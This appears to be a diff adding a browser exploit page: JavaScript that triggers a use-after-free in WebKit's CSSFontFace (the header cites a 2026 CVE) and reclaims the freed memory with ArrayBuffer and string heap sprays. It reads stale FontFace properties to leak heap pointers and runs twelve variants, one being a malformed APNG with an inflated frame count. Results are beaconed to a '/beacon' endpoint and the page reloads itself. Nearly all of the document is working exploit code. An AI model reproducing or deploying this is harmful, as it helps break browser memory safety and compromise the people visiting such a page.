@@ -1,0 +1,523 @@
+<!--
+  p622v2: CSSFontFace info leak via FontFace UAF + AB(192) reclaim.
+
+  Based on ntfargo CVE-2026-43715 and issue #60 findings:
+  - CSSFontFace is 192 bytes in regular bmalloc (NOT Gigacage)
+  - local(Arial) causes synchronous resolution → CSSFontFace freed
+  - AB(192) can reclaim the slot (Gigacage irrelevant: we read through
+    CSSFontFace's own property getters, not AB typed array views)
+  - Reading FontFace.family/.status after reclaim dereferences into AB data
+
+  Correct trigger sequence (ntfargo):
+  1. Create FontFace with local() source
+  2. Add to document.fonts
+  3. Trigger load (synchronous for local fonts)
+  4. document.fonts.delete() or clear() → CSSFontFace ref dropped
+  5. Spray AB(192) to reclaim the freed slot
+  6. Read stale FontFace properties → heap pointer leak
+
+  CRASH_CLASS: HIGH (UAF dereference)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p622</title></head>
+<body><pre id="out">p622v2 fontface local leak</pre>
+<script>
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(m){
+  say(m);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P622-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2hex(f){_f64[0]=f;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+var idx=0;
+try{idx=parseInt(localStorage.getItem('p622v2_idx'))||0;}catch(e){}
+
+var TESTS=[
+  /* A: Core technique — add/load/delete/spray-AB(192)/read */
+  {name:'A', desc:'add-load-delete-AB192'},
+  /* B: add/load/clear instead of delete */
+  {name:'B', desc:'add-load-clear-AB192'},
+  /* C: Multiple FontFaces, delete all, spray */
+  {name:'C', desc:'multi-ff-delete-AB192'},
+  /* D: loaded.then callback timing — spray inside then */
+  {name:'D', desc:'then-callback-spray'},
+  /* E: No add — just load via FontFaceSet constructor */
+  {name:'E', desc:'ffs-constructor-load'},
+  /* F: CSS rule insertion + removal */
+  {name:'F', desc:'css-rule-remove-AB192'},
+  /* G: Delayed read at 60ms */
+  {name:'G', desc:'add-load-delete-delay60'},
+  /* H: Delayed read at 400ms */
+  {name:'H', desc:'add-load-delete-delay400'},
+  /* I: String(172) reclaim instead of AB */
+  {name:'I', desc:'add-load-delete-str172'},
+  /* J: AB(176) — try nearby size class */
+  {name:'J', desc:'add-load-delete-AB176'},
+  /* K: AB(208) — try next size class up */
+  {name:'K', desc:'add-load-delete-AB208'},
+  /* L: APNG acTL frame-count inflation */
+  {name:'L', desc:'apng-actl-inflate'},
+];
+
+if(idx>=TESTS.length){
+  bk('DONE:all-'+TESTS.length+'-tested');
+  try{localStorage.removeItem('p622v2_idx');}catch(e){}
+}
+
+function sprayAB(sz, count, marker){
+  var abs=[];
+  for(var i=0;i<count;i++){
+    var ab=new ArrayBuffer(sz);
+    var v=new DataView(ab);
+    /* Fill with recognizable pattern — fake pointers */
+    for(var j=0;j+7<sz;j+=8){
+      v.setUint32(j, 0xDEAD0000|i, true);
+      v.setUint32(j+4, 0x41414141, true);
+    }
+    abs.push(ab);
+  }
+  return abs;
+}
+
+function readFF(ff, label){
+  var props=['family','style','weight','stretch','unicodeRange',
+             'variant','featureSettings','display','status'];
+  var results=[];
+  var dominated=true;
+  for(var i=0;i<props.length;i++){
+    try{
+      var val=ff[props[i]];
+      var s=String(val).substring(0,80);
+      results.push(props[i]+'='+s);
+      /* Check for unusual values indicating reclaim */
+      if(props[i]==='status'){
+        if(val!=='unloaded'&&val!=='loading'&&val!=='loaded'&&val!=='error'){
+          bk(label+'-UNUSUAL-STATUS:'+s);
+          dominated=false;
+        }
+      }
+      if(props[i]==='family' && typeof val==='string'){
+        /* Check for non-ASCII chars indicating heap data */
+        for(var j=0;j<val.length&&j<16;j++){
+          var cc=val.charCodeAt(j);
+          if(cc>127||cc===0){
+            var dump='';
+            for(var k=0;k<Math.min(32,val.length);k++){
+              dump+=('0000'+val.charCodeAt(k).toString(16)).slice(-4);
+            }
+            bk(label+'-FAMILY-LEAK:len='+val.length+',dump='+dump.substring(0,400));
+            dominated=false;
+            break;
+          }
+        }
+      }
+    }catch(e){
+      results.push(props[i]+'=ERR:'+e.message.substring(0,40));
+      bk(label+'-PROP-ERR:'+props[i]+'='+e.message.substring(0,80));
+      dominated=false;
+    }
+  }
+  bk(label+'-PROPS:'+results.join(',').substring(0,400));
+  return dominated;
+}
+
+function main(){
+  if(idx>=TESTS.length) return;
+  var t=TESTS[idx];
+  try{localStorage.setItem('p622v2_idx',String(idx+1));}catch(e){}
+  bk('BOOT:idx='+idx+'/'+TESTS.length+',test='+t.name+'='+t.desc);
+
+  /* === Test L: APNG acTL frame-count inflation === */
+  if(t.name==='L'){
+    testAPNG();
+    return;
+  }
+
+  /* === Test F: CSS @font-face rule removal === */
+  if(t.name==='F'){
+    testCSSRule();
+    return;
+  }
+
+  /* === Tests A-K: FontFace API === */
+  testFontFace(t);
+}
+
+function testFontFace(t){
+  try{
+    var delay=0;
+    if(t.name==='G') delay=60;
+    if(t.name==='H') delay=400;
+
+    /* Step 1: Create FontFace(s) with local() source */
+    var faces=[];
+    var count=(t.name==='C')?16:1;
+    for(var i=0;i<count;i++){
+      var ff=new FontFace('lf'+i,'local(Arial)',{unicodeRange:'U+00'+('00'+(i*16).toString(16)).slice(-2)+'-00FF'});
+      faces.push(ff);
+    }
+    bk('FF-CREATED:n='+faces.length+',status='+faces[0].status);
+
+    /* Step 2: Add to document.fonts */
+    if(t.name==='E'){
+      /* Use FontFaceSet constructor instead */
+      try{
+        var ffs=new FontFaceSet(faces);
+        bk('FFS-CREATED:size='+ffs.size);
+        ffs.load('16px lf0','A');
+        bk('FFS-LOAD-CALLED');
+      }catch(e){
+        bk('FFS-ERR:'+e.message.substring(0,80));
+      }
+    } else {
+      for(var i=0;i<faces.length;i++){
+        document.fonts.add(faces[i]);
+      }
+      bk('FONTS-ADDED:size='+document.fonts.size);
+
+      /* Step 3: Trigger load */
+      if(t.name==='D'){
+        /* Spray inside the then callback */
+        faces[0].loaded.then(function(){
+          bk('THEN-FIRED');
+          document.fonts.delete(faces[0]);
+          var abs=sprayAB(192, 500, 0xBEEF);
+          bk('SPRAY-IN-THEN:n='+abs.length);
+          readFF(faces[0], 'D');
+          finish();
+        });
+        /* Also trigger load */
+        document.fonts.load('16px lf0','A');
+        bk('LOAD-CALLED');
+        return; /* async path */
+      }
+
+      /* Synchronous load trigger for local fonts */
+      try{
+        document.fonts.load('16px lf0','A');
+        bk('LOAD-CALLED:status='+faces[0].status);
+      }catch(e){
+        bk('LOAD-ERR:'+e.message.substring(0,80));
+      }
+
+      /* Force layout to ensure font resolution */
+      var div=document.createElement('div');
+      div.style.fontFamily='lf0';
+      div.textContent='test';
+      document.body.appendChild(div);
+      document.body.offsetHeight;
+
+      /* Step 4: Remove from document.fonts → drop CSSFontFace ref */
+      if(t.name==='B'){
+        document.fonts.clear();
+        bk('FONTS-CLEARED:size='+document.fonts.size);
+      } else {
+        for(var i=0;i<faces.length;i++){
+          document.fonts.delete(faces[i]);
+        }
+        bk('FONTS-DELETED:size='+document.fonts.size);
+      }
+
+      /* Also access loaded to trigger then-getter lifecycle */
+      void faces[0].loaded;
+      bk('LOADED-ACCESSED');
+
+      document.body.removeChild(div);
+    }
+
+    function doSprayAndRead(){
+      /* Step 5: Spray to reclaim freed CSSFontFace */
+      var abs=[];
+      if(t.name==='I'){
+        /* String spray instead of AB */
+        var strs=[];
+        for(var i=0;i<500;i++){
+          var s='';
+          for(var j=0;j<172;j++) s+=String.fromCharCode(0x41+(j%26));
+          strs.push(s);
+        }
+        bk('STR-SPRAY:n='+strs.length);
+      } else {
+        var sz=192;
+        if(t.name==='J') sz=176;
+        if(t.name==='K') sz=208;
+        abs=sprayAB(sz, 500, 0xBEEF);
+        bk('AB-SPRAY:n='+abs.length+',sz='+sz);
+      }
+
+      /* Step 6: Read through stale FontFace wrapper */
+      for(var i=0;i<faces.length;i++){
+        var normal=readFF(faces[i], t.name+'-f'+i);
+      }
+
+      /* Also try reading loaded promise */
+      try{
+        var p=faces[0].loaded;
+        bk(t.name+'-LOADED-TYPE:'+typeof p);
+      }catch(e){
+        bk(t.name+'-LOADED-ERR:'+e.message.substring(0,80));
+      }
+
+      /* Check AB spray for corruption (evidence of overlap) */
+      if(abs.length>0){
+        var corrupt=0;
+        for(var i=0;i<abs.length;i++){
+          var v=new DataView(abs[i]);
+          var first=v.getUint32(0, true);
+          if((first&0xFFFF0000)!==0xDEAD0000){
+            corrupt++;
+            if(corrupt<=3){
+              var dump='';
+              for(var k=0;k<Math.min(32,abs[i].byteLength);k+=4){
+                dump+=('00000000'+v.getUint32(k,true).toString(16)).slice(-8)+' ';
+              }
+              bk(t.name+'-AB-CORRUPT:i='+i+',dump='+dump.substring(0,200));
+            }
+          }
+        }
+        bk(t.name+'-AB-CORRUPT-COUNT:'+corrupt+'/'+abs.length);
+      }
+    }
+
+    if(delay>0){
+      setTimeout(function(){
+        doSprayAndRead();
+        finish();
+      }, delay);
+      return;
+    }
+
+    doSprayAndRead();
+    finish();
+
+  }catch(e){
+    bk('ERR:'+e.message);
+    finish();
+  }
+}
+
+function testCSSRule(){
+  try{
+    var style=document.createElement('style');
+    var css='';
+    for(var i=0;i<64;i++){
+      css+='@font-face{font-family:cf'+i+';src:local(Arial);unicode-range:U+00'+
+        ('00'+(i*4).toString(16)).slice(-2)+'-00FF;}\n';
+    }
+    style.textContent=css;
+    document.head.appendChild(style);
+    bk('CSS-ADDED:fonts='+document.fonts.size);
+
+    /* Force layout */
+    var div=document.createElement('div');
+    div.style.fontFamily='cf0';
+    div.textContent='test';
+    document.body.appendChild(div);
+    document.body.offsetHeight;
+
+    /* Remove style → frees CSSFontFace objects */
+    style.remove();
+    document.body.removeChild(div);
+    document.body.offsetHeight;
+    bk('CSS-REMOVED:fonts='+document.fonts.size);
+
+    /* Spray AB(192) */
+    var abs=sprayAB(192, 1000, 0xCAFE);
+    bk('F-AB-SPRAY:n='+abs.length);
+
+    /* We can't read through CSS-created FontFaces since we have no JS ref.
+       Instead check if any AB got corrupted by lingering writes */
+    var corrupt=0;
+    for(var i=0;i<abs.length;i++){
+      var v=new DataView(abs[i]);
+      var first=v.getUint32(0, true);
+      if((first&0xFFFF0000)!==0xCAFE0000){
+        corrupt++;
+        if(corrupt<=3){
+          var dump='';
+          for(var k=0;k<Math.min(32,abs[i].byteLength);k+=4){
+            dump+=('00000000'+v.getUint32(k,true).toString(16)).slice(-8)+' ';
+          }
+          bk('F-AB-CORRUPT:i='+i+',dump='+dump.substring(0,200));
+        }
+      }
+    }
+    bk('F-CORRUPT-COUNT:'+corrupt+'/'+abs.length);
+  }catch(e){
+    bk('F-ERR:'+e.message);
+  }
+  finish();
+}
+
+function testAPNG(){
+  /* Build APNG with inflated acTL num_frames */
+  try{
+    var crcTable=null;
+    function makeCrcTable(){
+      crcTable=new Uint32Array(256);
+      for(var n=0;n<256;n++){
+        var c=n;
+        for(var k=0;k<8;k++) c=c&1?0xEDB88320^(c>>>1):c>>>1;
+        crcTable[n]=c;
+      }
+    }
+    function crc32(buf,off,len){
+      if(!crcTable)makeCrcTable();
+      var c=0xFFFFFFFF;
+      for(var i=off;i<off+len;i++) c=crcTable[(c^buf[i])&0xFF]^(c>>>8);
+      return (c^0xFFFFFFFF)>>>0;
+    }
+    function w32(buf,off,v){
+      buf[off]=(v>>>24)&0xFF;buf[off+1]=(v>>>16)&0xFF;
+      buf[off+2]=(v>>>8)&0xFF;buf[off+3]=v&0xFF;
+    }
+    function makeChunk(type,data){
+      var t=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];
+      var chunk=new Uint8Array(4+4+data.length+4);
+      w32(chunk,0,data.length);
+      chunk[4]=t[0];chunk[5]=t[1];chunk[6]=t[2];chunk[7]=t[3];
+      chunk.set(data,8);
+      var c=crc32(chunk,4,4+data.length);
+      w32(chunk,8+data.length,c);
+      return chunk;
+    }
+    function concat(){
+      var total=0;
+      for(var i=0;i<arguments.length;i++) total+=arguments[i].length;
+      var out=new Uint8Array(total);var off=0;
+      for(var i=0;i<arguments.length;i++){out.set(arguments[i],off);off+=arguments[i].length;}
+      return out;
+    }
+    function zlibStore(raw){
+      var out=new Uint8Array(raw.length+11+Math.ceil(raw.length/65535)*5);
+      var p=0;
+      out[p++]=0x78;out[p++]=0x01;
+      var rem=raw.length;var rp=0;
+      while(rem>0){
+        var bsz=Math.min(rem,65535);
+        out[p++]=rem<=65535?1:0;
+        out[p++]=bsz&0xFF;out[p++]=(bsz>>8)&0xFF;
+        out[p++]=(~bsz)&0xFF;out[p++]=((~bsz)>>8)&0xFF;
+        for(var i=0;i<bsz;i++) out[p++]=raw[rp++];
+        rem-=bsz;
+      }
+      var a=1,b=0;
+      for(var i=0;i<raw.length;i++){a=(a+raw[i])%65521;b=(b+a)%65521;}
+      w32(out,p,(b<<16)|a);p+=4;
+      return out.subarray(0,p);
+    }
+
+    var PNG_SIG=new Uint8Array([137,80,78,71,13,10,26,10]);
+    var IEND=makeChunk('IEND',new Uint8Array(0));
+
+    /* IHDR: 4x4 RGBA */
+    var ihdr_d=new Uint8Array(13);
+    w32(ihdr_d,0,4);w32(ihdr_d,4,4);
+    ihdr_d[8]=8;ihdr_d[9]=6;
+    var ihdr=makeChunk('IHDR',ihdr_d);
+
+    /* acTL with inflated num_frames (claim 256 frames, provide 1) */
+    var actl_d=new Uint8Array(8);
+    w32(actl_d,0,256); /* num_frames = 256 (but only 1 frame provided) */
+    w32(actl_d,4,0);
+    var actl=makeChunk('acTL',actl_d);
+
+    /* fcTL for frame 1 */
+    var fctl_d=new Uint8Array(26);
+    w32(fctl_d,0,0); /* sequence_number */
+    w32(fctl_d,4,4);w32(fctl_d,8,4); /* width, height */
+    w32(fctl_d,12,0);w32(fctl_d,16,0); /* x,y offset */
+    fctl_d[20]=0;fctl_d[21]=100; /* delay_num */
+    fctl_d[22]=0;fctl_d[23]=100; /* delay_den (1 fps) */
+    fctl_d[24]=0;fctl_d[25]=0; /* dispose=none, blend=source */
+    var fctl=makeChunk('fcTL',fctl_d);
+
+    /* IDAT: 4x4 red pixels */
+    var rowLen=1+4*4;
+    var raw=new Uint8Array(rowLen*4);
+    for(var y=0;y<4;y++){
+      raw[y*rowLen]=0;
+      for(var x=0;x<4;x++){
+        var off=y*rowLen+1+x*4;
+        raw[off]=0xFF;raw[off+1]=0;raw[off+2]=0;raw[off+3]=0xFF;
+      }
+    }
+    var idat=makeChunk('IDAT',zlibStore(raw));
+
+    var png=concat(PNG_SIG,ihdr,actl,fctl,idat,IEND);
+    bk('L-PNG:sz='+png.length+',frames=256');
+
+    /* Heap spray before loading */
+    var spray=[];
+    for(var i=0;i<2000;i++){
+      var ab=new ArrayBuffer(64);
+      var v=new Uint8Array(ab);
+      for(var j=0;j<64;j+=8){
+        v[j]=0x78;v[j+1]=0x56;v[j+2]=0x34;v[j+3]=0x12;
+        v[j+4]=0x00;v[j+5]=0x8C;v[j+6]=0x00;v[j+7]=0x10;
+      }
+      spray.push(ab);
+    }
+    for(var i=0;i<1000;i++) spray[i]=null;
+    bk('L-SPRAY:freed=1000');
+
+    var blob=new Blob([png],{type:'image/png'});
+    var url=URL.createObjectURL(blob);
+    var img=new Image();
+    img.onload=function(){
+      bk('L-LOADED:w='+img.naturalWidth+',h='+img.naturalHeight);
+      var c=document.createElement('canvas');
+      c.width=img.naturalWidth;c.height=img.naturalHeight;
+      var ctx=c.getContext('2d');
+      ctx.drawImage(img,0,0);
+      var id=ctx.getImageData(0,0,c.width,c.height);
+      var d=id.data;
+
+      var nonZero=0;var ptrCandidates=[];
+      for(var i=0;i<d.length;i+=4){
+        if(d[i]!==0||d[i+1]!==0||d[i+2]!==0||d[i+3]!==0) nonZero++;
+      }
+      for(var i=0;i+7<d.length;i+=4){
+        var hi=(d[i+7]<<24)|(d[i+6]<<16)|(d[i+5]<<8)|d[i+4];
+        if((hi>>>16)===0x1000){
+          var lo=(d[i+3]<<24)|(d[i+2]<<16)|(d[i+1]<<8)|d[i];
+          ptrCandidates.push('px'+Math.floor(i/4)+':0x'+
+            ('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8));
+        }
+      }
+      var hex='';
+      for(var i=0;i<Math.min(64,d.length/4);i++){
+        hex+=('00'+d[i*4].toString(16)).slice(-2)+('00'+d[i*4+1].toString(16)).slice(-2)+
+             ('00'+d[i*4+2].toString(16)).slice(-2)+('00'+d[i*4+3].toString(16)).slice(-2)+' ';
+      }
+      bk('L-SCAN:nz='+nonZero+',ptrs='+ptrCandidates.length);
+      bk('L-HEX:'+hex.substring(0,400));
+      if(ptrCandidates.length>0) bk('L-PTRS:'+ptrCandidates.join(',').substring(0,400));
+      else bk('L-NO-PTRS');
+      URL.revokeObjectURL(url);
+      finish();
+    };
+    img.onerror=function(){
+      bk('L-ERR:load-failed');
+      URL.revokeObjectURL(url);
+      finish();
+    };
+    img.src=url;
+  }catch(e){
+    bk('L-ERR:'+e.message);
+    finish();
+  }
+}
+
+function finish(){
+  bk('NEXT:idx='+(idx+1));
+  setTimeout(function(){location.reload();},1500);
+}
+
+setTimeout(main,0);
+</script>
+</body></html>
